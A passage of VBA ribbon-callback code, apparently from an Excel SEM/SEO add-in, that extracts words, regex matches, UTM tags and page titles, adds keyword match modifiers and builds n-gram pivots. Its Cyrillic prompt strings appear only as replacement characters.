UDFArr2PS "extrREFirst", p
End Sub
Sub SEM_ExtrREAll(control As IRibbonControl)
Dim p As String, delim As String
p = Application.InputBox("Regex-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
delim = Application.InputBox("|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|):", "", Type:=2)
UDFArr3PS "extrREAll", p, delim
End Sub
Sub SEM_ExtrReMail(control As IRibbonControl)
UDFArr2PS "extrREFirst", "[A-z0-9._%+-]+@[A-z0-9.-]+\.[A-z]{2,4}"
End Sub
Sub SEM_ExtrRePhone(control As IRibbonControl)
UDFArr "extrREPhone"
End Sub
Sub SEM_ExtrReDDMMYYYY(control As IRibbonControl)
UDFArr2PS "extrREFirst", "([0-3][0-9]-[0-1][0-9]-[12]\d{3}|[0-3][0-9]\.[0-1][0-9]\.[12]\d{3}|[0-3][0-9]/[0-1][0-9]/[12]\d{3})"
End Sub
Sub SEM_ExtrReYYYYMMDD(control As IRibbonControl)
UDFArr2PS "extrREFirst", "([12]\d{3}-[0-1][0-9]-[0-3][0-9]|[12]\d{3}\.[0-1][0-9]\.[0-3][0-9]|[12]\d{3}/[0-1][0-9]/[0-3][0-9])"
End Sub
Sub SEM_extrBold(control As IRibbonControl)
UDFrng "extrBold"
End Sub
Sub SEM_Extrtsifry(control As IRibbonControl)
UDFArr ("extrDigits")
End Sub
Sub SEM_extrFirst1Sym(control As IRibbonControl)
UDFArr2PL "extrFirstNSym", 1
End Sub
Sub SEM_extrFirstNsym(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=1)
UDFArr2PL "extrFirstNsym", n
End Sub
Sub SEM_extrLastNsym(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=1)
UDFArr2PL "extrLastNSym", n
End Sub
Sub SEM_ExtrBeforeFirstIncl(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
UDFArr2PS "extrBeforeFirstIncl", s
End Sub
Sub SEM_ExtrBeforeFirstNotIncl(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
UDFArr2PS "extrBeforeFirstNotIncl", s
End Sub
Sub SEM_ExtrAfterLastIncl(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
UDFArr2PS "extrAfterLastIncl", s
End Sub
Sub SEM_ExtrAfterLastNotIncl(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
UDFArr2PS "extrAfterLastNotIncl", s
End Sub
'words
Sub SEM_extrWord(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "", Type:=2)
UDFArr2PS "extrWordsFullMatch", s
End Sub
Sub SEM_extrWordList(control As IRibbonControl)
Dim UserRange As Range
Set UserRange = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", title:="Find words from list:", Type:=8)
extr_list_rng UserRange
End Sub
Sub SEM_ExtrWContList(control As IRibbonControl)
Dim UserRange As Range
Set UserRange = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", title:="Find words from list:", Type:=8)
extrWordsPatternListMatchAny UserRange
End Sub
'morphs
Sub SEM_extrNouns(control As IRibbonControl)
Get_lemmDict
UDFArr "extrN"
End Sub
Sub SEM_extrVerbs(control As IRibbonControl)
Get_lemmDict
UDFArr "extrV"
End Sub
Sub SEM_extrAdj(control As IRibbonControl)
Get_lemmDict
UDFArr "extrA"
End Sub
Sub SEM_extrAdverbs(control As IRibbonControl)
Get_lemmDict
UDFArr "extrAdvb"
End Sub
're
Sub SEM_extrWordsByLikePattern(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="pattern:", Type:=2)
UDFArr2PS "extrWordsByLIKEPattern", param2
End Sub
Sub SEM_extrWordsByRePattern(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="pattern:", Type:=2)
UDFArr2PS "extrWordsByRePattern", param2
End Sub
Sub SEM_Extr_UA(control As IRibbonControl)
UDFArr ("ExtrUA")
End Sub
Sub SEM_Extr_CD(control As IRibbonControl)
UDFArr ("ExtrDC")
End Sub
Sub SEM_Extr_LC(control As IRibbonControl)
UDFArr ("ExtrLC")
End Sub
Sub SEM_Extr_D(control As IRibbonControl)
UDFArr ("extrWContNum")
End Sub
Sub SEM_Extr_L(control As IRibbonControl)
UDFArr ("extrWContLat")
End Sub
Sub SEM_Extr_LD(control As IRibbonControl)
UDFArr ("ExtrLD")
End Sub
Sub SEM_extrWcontUCase(control As IRibbonControl)
UDFArr "extrWcontUCase"
End Sub
Sub SEM_izvlyechmarkyerypokupki(control As IRibbonControl)
extr_list_1DimArr Split(markyerypokupki(), "\")
End Sub
Sub SEM_izvlyechmarkyeryaryendy(control As IRibbonControl)
extr_list_1DimArr Split(markyeryaryendy(), "|")
End Sub
Sub SEM_izvlyechmarkyeryotzyvov(control As IRibbonControl)
extr_list_1DimArr Split(markyeryotzyvov(), "|")
End Sub
Sub SEM_ExtrFirst1Word(control As IRibbonControl)
UDFArr "extrFirstWord"
End Sub
Sub SEM_ExtrFirst2Words(control As IRibbonControl)
UDFArr2PL "extrFirstNWords", 2
End Sub
Sub SEM_ExtrFirst3Words(control As IRibbonControl)
UDFArr2PL "extrFirstNWords", 3
End Sub
Sub SEM_ExtrFirstNWords(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", "", Type:=1)
UDFArr2PL "extrFirstNWords", n
End Sub
Sub SEM_ExtrLast1Word(control As IRibbonControl)
UDFArr2PL "extrLastNWords", 1
End Sub
Sub SEM_ExtrLast2Words(control As IRibbonControl)
UDFArr2PL "extrLastNWords", 2
End Sub
Sub SEM_ExtrLast3Words(control As IRibbonControl)
UDFArr2PL "extrLastNWords", 3
End Sub
Sub SEM_ExtrLastNWords(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:", "", Type:=1)
UDFArr2PL "ExtrLastNWords", n
End Sub
Sub SEM_ExtrWordsStarting(control As IRibbonControl)
Dim n As String
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|:", "", Type:=2)
UDFArr2PS "ExtrWordsStartingWith", n
End Sub
Sub SEM_ExtrWordsEnding(control As IRibbonControl)
Dim n As String
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|:", "", Type:=2)
UDFArr2PS "extrWordsEndingWith", n
End Sub
Sub SEM_extrSuf(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Type:=8)
If MsgBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? (|fffd||fffd||fffd| = |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", vbQuestion + vbYesNo) = vbYes Then
UDFArr2PRng "extrSuffixesAll", rng
Else:
UDFArr2PRng "extrSuffixes", rng
End If
End Sub
Sub SEM_extrPref(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Type:=8)
If MsgBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? (|fffd||fffd||fffd| = |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", vbQuestion + vbYesNo) = vbYes Then
UDFArr2PRng "extrPrefixesAll", rng
Else:
UDFArr2PRng "extrPrefixes", rng
End If
End Sub
Sub SEM_extrContains(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Type:=8)
If MsgBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? (|fffd||fffd||fffd| = |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", vbQuestion + vbYesNo) = vbYes Then
UDFArr2PRng "extrPatternsAll", rng
Else:
UDFArr2PRng "extrPatterns", rng
End If
End Sub
Sub SEM_extrWordsStartingWithAnyFromRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "extrWordsStartingWithAnyFromRng", rng
End Sub
Sub SEM_extrWordsEndingWithAnyFromRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "extrWordsEndingWithAnyFromRng", rng
End Sub
Sub SEM_izvlyechslovaiztsifr(control As IRibbonControl)
UDFArr ("extrNumW")
End Sub
Sub SEM_izvlyechslovaizkirillitsy(control As IRibbonControl)
UDFArr ("extrWordsAllCyr")
End Sub
Sub SEM_izvlyechslovaizlatinitsy(control As IRibbonControl)
UDFArr ("extrWordsAllLatin")
End Sub
Sub SEM_Extrtoponimy(control As IRibbonControl)
extrPhrases abc.Range("GEO_Toponyms")
End Sub
Sub SEM_ExtrQuestions(control As IRibbonControl)
extrPhrases abc.Range("questions")
End Sub

'phrases
Sub SEM_extrTopsWithPrepsRu(control As IRibbonControl)
extrTopsWithPreps False
End Sub
Sub SEM_extrTopsWithPrepsEn(control As IRibbonControl)
extrTopsWithPreps True
End Sub
Sub SEM_extrPhrases(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", Type:=8)
extrPhrases rng
End Sub
'cells
Sub SEM_ExtrCellsContainingPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "extrIfContPLst", rng
End Sub
Sub SEM_ExtrCellsStartingWithPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "extrIfStartsWithPLst", rng
End Sub
Sub SEM_ExtrCellsEndingWithPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "extrIfEndsWithPLst", rng
End Sub
Sub SEM_extrCellsFromList(control As IRibbonControl)
Dim r As Long, extracted As Object, a(), w(), UserRange As Range
Set UserRange = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
OptimizeON
    a = UserRange.Value2
    w = Selection.Value2
    Set extracted = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If extracted.exists(UCase$(a(r, 1))) Then Else extracted.Add UCase$(a(r, 1)), False
        Next
For r = LBound(w) To UBound(w):
    If extracted.exists(UCase(w(r, 1))) Then Else w(r, 1) = ""
Next r
    Selection.Value2 = w
OptimizeOFF
End Sub
Sub SEM_ExtrCellsContainingWord(control As IRibbonControl)
Dim s As String
s = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", Type:=2)
UDFArr2PS "extrIfContW", s
End Sub
Sub SEM_ExtrCellsContainingWordLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "extrIfContWordLst", abc.Range("BSR")
remBSR
End Sub
Sub SEM_ExtrCellsContUA(control As IRibbonControl)
UDFArr "extrIfUA"
End Sub
Sub SEM_ExtrCellsContNum(control As IRibbonControl)
UDFArr "extrIfHasNum"
End Sub
Sub SEM_ExtrCellsContLat(control As IRibbonControl)
UDFArr "extrIfContLat"
End Sub
Sub SEM_ExtrCellsContNumW(control As IRibbonControl)
UDFArr "extrIfHasNumW"
End Sub
Sub SEM_ExtrCellsContLatW(control As IRibbonControl)
UDFArr "extrIfhasLatW"
End Sub
Sub SEM_ExtrCellsContProper(control As IRibbonControl)
UDFArr "extrIfContUCase"
End Sub
Sub SEM_ExtrCellsMatchRE(control As IRibbonControl)
UDFArr "extrIfMatchesRE"
End Sub
'|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Sub SEM_extrUniqueCells(control As IRibbonControl)
CellsByRep True, "extr"
End Sub
Sub SEM_extrNonUniqueCells(control As IRibbonControl)
CellsByRep False, "extr"
End Sub
'>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
'join & combine
Sub joinRngHorisontally(control As IRibbonControl)
Dim x As String
x = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=2)
    mergeRngHor x
End Sub

Sub SEM_gyenyerator_linyeynykh_kombinatsiy(control As IRibbonControl)
gyenyerator_linyeynykh_kombinatsiy
End Sub
Sub SEM_permute(control As IRibbonControl)
PermuteSeveralWords
End Sub
Sub SEM_razvyernut_krossminusovku(control As IRibbonControl)
Dim a(), x As String
On Error Resume Next
a = Selection.Value2
x = Application.InputBox("Please, specify delimeter", "Delimeter", Type:=2)
unpivotArr a, x
End Sub
Sub SEM_createSUMPivotFromSelectedColumns(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createPivotDictFromNColumns 1, 1, n, "sum"
End Sub
Sub SEM_createMINPivotFromSelectedColumns(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createPivotDictFromNColumns 1, 1, n, "min"
End Sub
Sub SEM_createMAXPivotFromSelectedColumns(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createPivotDictFromNColumns 1, 1, n, "max"
End Sub
Sub SEM_pivotConcat(control As IRibbonControl)
pivotConcat
End Sub
Sub SEM_selfCombine(control As IRibbonControl)
selfCombineSelection
End Sub
Sub SEM_Clusterize(control As IRibbonControl)
Clusterize
End Sub
Sub SEM_sobrat_stolbtsy_v_odin(control As IRibbonControl)
sobrat_stolbtsy_v_odin
End Sub
'>>>>>>>>>>>>>>>>>>>>>>>>>>>>

''''' <><><><><><><><><><>< SEM & SEO
'change
Private Function prostavitmodifikatory(x As String) As String
prostavitmodifikatory = insertBeforeWords(x, "+")
End Function
Sub SEM_prostavitvsyesmodifikatorami(control As IRibbonControl)
UDFArr ("prostavitmodifikatory")
End Sub
Sub SEM_prostavitmodifikatorykromyestopslov(control As IRibbonControl)
UDFArr ("prostavitmodifikatory")
udalitmodifikatorystopslov
End Sub
Sub SEM_prostavitmodifikatoryustopslov(control As IRibbonControl)
prostavitmodifikatoryustopslov
End Sub
Sub SEM_zakryepitvsyeslovoformy(control As IRibbonControl)
UDFArr ("zakryepitslovoformy")
End Sub
Sub SEM_vsyevtochnom(control As IRibbonControl)
UDFArr ("vkavychki")
End Sub
Sub SEM_vsyetochnososlovoformami(control As IRibbonControl)
UDFArr ("tochnoyesoslovoformami")
End Sub
Sub SEM_vsyesvyerkhtochnoye(control As IRibbonControl)
UDFArr ("svyerkhtochnoye")
End Sub
Sub SEM_vsyevofrazovom(control As IRibbonControl)
UDFArr ("sqBr")
End Sub
Sub SEM_vsyevshirokom(control As IRibbonControl)
UDFArr ("remMdf")
End Sub
Sub SEM_lyemmatizatsiya(control As IRibbonControl)
Get_lemmDict
arrlemmthroughdict
End Sub
Sub SEM_normalizatsiya(control As IRibbonControl)
Get_lemmDict
arrlemmthroughdict
UDFArr ("sortInCellAZ")
End Sub
Sub SEM_declineWords(control As IRibbonControl)
    Dim dict As Object, i As Long, arr(), inp(), arr2(), x As Long, tmpstr As String
    Get_lemmDict
    Set dict = CreateObject("Scripting.Dictionary")
    arr = Range("[lemms.xlsb]lemmdict!slovarlyemm").Value2
    For i = LBound(arr) To UBound(arr)
        If arr(i, 3) = "v" Then
        Else:
        If dict.exists(arr(i, 2)) Then dict.item(arr(i, 2)) = dict.item(arr(i, 2)) & vbTab & arr(i, 1) Else dict.Add arr(i, 2), arr(i, 1)
        End If
    Next i
'adapt
inp = Selection.Value2
x = Selection.Columns.Count
i = UBound(inp)
ReDim arr2(i, 1)
For i = LBound(inp) To UBound(inp)
    arr2(i, 1) = inp(i, 1)
    For j = 2 To x
        arr2(i, 1) = arr2(i, 1) & "\" & inp(i, j)
    Next j
Next i
'adapt
For i = LBound(inp) To UBound(inp)
tmpstr = lemmatstr(LCase$(inp(i, x)))
    If dict.exists(tmpstr) Then
    inp(i, 1) = arr2(i, 1) & vbTab & inp(i, x) & vbTab & dict.item(tmpstr)
    Else:
    inp(i, 1) = arr2(i, 1) & vbTab & inp(i, x)
    End If
Next i
unpivotArr inp, vbTab, "Morphs"
End Sub
'Extract
Sub SEM_ExtrTitle(control As IRibbonControl)
Dim t As Long
t = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 1 |fffd||fffd| 9):", "", Type:=1)
UDFrngLive "getTitle", t
End Sub
Sub SEM_ExtrH1(control As IRibbonControl)
Dim t As Long
t = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 1 |fffd||fffd| 9):", "", Type:=1)
UDFrngLive "getH1", t
End Sub
Sub SEM_ExtrResponseCode(control As IRibbonControl)
Dim t As Long
t = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 1 |fffd||fffd| 9):", "", Type:=1)
UDFrngLive "getHttpResponse", t
End Sub
Sub SEM_ExtrGipyerssylki(control As IRibbonControl)
Dim hl As Hyperlink
For Each hl In Selection.Hyperlinks
hl.Range.Value2 = hl.Address
Next
End Sub
Sub SEM_extrSource(control As IRibbonControl)
UDFArr ("extrSource")
End Sub
Sub SEM_extrMedium(control As IRibbonControl)
UDFArr ("extrMedium")
End Sub
Sub SEM_extrCampaign(control As IRibbonControl)
UDFArr ("extrCampaign")
End Sub
Sub SEM_extrTerm(control As IRibbonControl)
UDFArr ("extrTerm")
End Sub
Sub SEM_extrContent(control As IRibbonControl)
UDFArr ("extrContent")
End Sub
'|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Sub SEM_extrWordCount(control As IRibbonControl)
UDFArr ("slov")
End Sub
Sub SEM_extrSymCount(control As IRibbonControl)
UDFArr ("symLen")
End Sub
Sub SEM_extrPixelCount(control As IRibbonControl)
UDFrng ("YDPixelLength2")
End Sub
Sub SEM_cellCount(control As IRibbonControl)
cellCount
End Sub
Sub cellsOrderCount(control As IRibbonControl)
Dim dict As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
selector
a = Selection.Value2
For i = LBound(a) To UBound(a)
    If dict.exists(UCase$(a(i, 1))) Then
    dict.item(UCase$(a(i, 1))) = dict.item(UCase$(a(i, 1))) + 1
    a(i, 1) = dict.item(UCase$(a(i, 1)))
    Else
    dict.Add UCase$(a(i, 1)), 1
    a(i, 1) = 1
    End If
Next i
Selection.Value2 = a
End Sub
Sub countShare(control As IRibbonControl)
Dim a(), i As Long, x As Double
selector
a = Selection.Value2
x = Application.WorksheetFunction.Sum(Selection.Columns(1))
For i = LBound(a) To UBound(a)
    a(i, 1) = a(i, 1) / x
Next i
Selection.Value = a
End Sub
Sub countShareSum(control As IRibbonControl)
Dim a(), i As Long, x As Double, it As Double
selector
a = Selection.Value2
x = Application.WorksheetFunction.Sum(Selection.Columns(1))
it = 0
For i = LBound(a) To UBound(a)
    it = it + a(i, 1)
    a(i, 1) = it / x
Next i
Selection.Value = a
End Sub
Sub SEM_extrFirstChild(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "firstChild", rng
End Sub
Sub SEM_extrFirstParent(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "firstParent", rng
End Sub
Sub SEM_extrFirstClosestBroadParent(control As IRibbonControl)
Dim rng As Range
Get_lemmDict
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "firstClosestBroadParent", rng
End Sub
Sub SEM_freqdict1grams(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createNgramPivotSumDictFromNColumns 1, 1, 1, n
End Sub
Sub SEM_freqdict2grams(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createNgramPivotSumDictFromNColumns 1, 1, 2, n
End Sub
Sub SEM_freqdict3grams(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createNgramPivotSumDictFromNColumns 1, 1, 3, n
End Sub
Sub SEM_freqdict4grams(control As IRibbonControl)
Dim n As Long
    n = Selection.Columns.Count - 1
createNgramPivotSumDictFromNColumns 1, 1, 4, n
End Sub
Sub SEM_freqdict5grams(control As IRibbonControl)
